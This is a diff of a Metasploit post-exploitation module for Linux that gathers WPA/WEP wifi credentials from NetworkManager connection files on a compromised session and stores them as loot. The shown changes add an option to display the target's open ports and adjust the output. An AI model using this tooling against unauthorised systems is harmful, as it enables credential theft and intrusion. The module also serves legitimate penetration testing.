@@ -21,7 +21,8 @@
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on => set SESSION 3
-# Dump credentials from remote system      => set DUMP_CREDS true
+# Dump credentials from remote system?     => set DUMP_CREDS true
+# Display remote target open ports?        => set OPEN_PORTS true
 # Store credentials in msf loot folder?    => set STORE_CREDS true
 # The default path for network connections => set REMOTE_DIR /etc/NetworkManager/system-connections
 #
@@ -91,11 +92,11 @@ class MetasploitModule < Msf::Post
                                         'peterubuntu10[at]sourceforge[dot]net', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.0',
-                        'DisclosureDate' => 'jun 6 2017',
+                        'Version'        => '$Revision: 1.1',
+                        'DisclosureDate' => 'jun 7 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
-                        'Privileged'     => 'true',
+                        'Privileged'     => 'true',  # root privs required in non-Kali distros
                         'Targets'        =>
                                 [
                                          [ 'linux' ]
@@ -124,11 +125,11 @@ class MetasploitModule < Msf::Post
                 register_advanced_options(
                         [
                                 OptString.new('STORE_CREDS', [ false, 'Store credentials in msf loot folder?', false]),
+                                OptString.new('OPEN_PORTS', [ false, 'Display remote target open ports?', false]),
                                 OptString.new('REMOTE_DIR', [ true, 'The default path for network connections'])
                         ], self.class)
  
         end
-
 
 
 
@@ -169,7 +170,7 @@ def ls_stage1
       Rex::sleep(1.0)
 
       #
-      # Display results on screen (wpa|wep|netstat) dump/gather info ..
+      # Display results on screen (wpa|wep) dump/gather info ..
       #
       vprint_line("")
       vprint_line("WPA CREDENTIALS:")
@@ -182,10 +183,16 @@ def ls_stage1
       vprint_line(wep_out)
       vprint_line("")
       Rex::sleep(0.5)
-      vprint_line("REMOTE OPEN PORTS:")
-      vprint_line("----------------")
-      vprint_line(open_ports)
-      vprint_line("")
+      #
+      # Display target open ports ..
+      #
+      if datastore['OPEN_PORTS'] == true
+        vprint_line("REMOTE OPEN PORTS:")
+        vprint_line("----------------")
+        vprint_line(open_ports)
+        vprint_line("")
+        Rex::sleep(0.5)
+      end
 
     #
     # Store dump in msf loot folder ..
@@ -194,8 +201,10 @@ def ls_stage1
     if datastore['STORE_CREDS'] == true
       vprint_good("Downloading dump to msf loot folder ..")
       loot_path = store_loot("wpa/wep dump", "text/plain", session, wpa_out, wep_out, open_ports, "wpa/wep credentials dump")
+      Rex::sleep(0.5)
       vprint_status("File stored in: #{loot_path}")
       vprint_line("")
+      Rex::sleep(0.5)
     end
 
   #
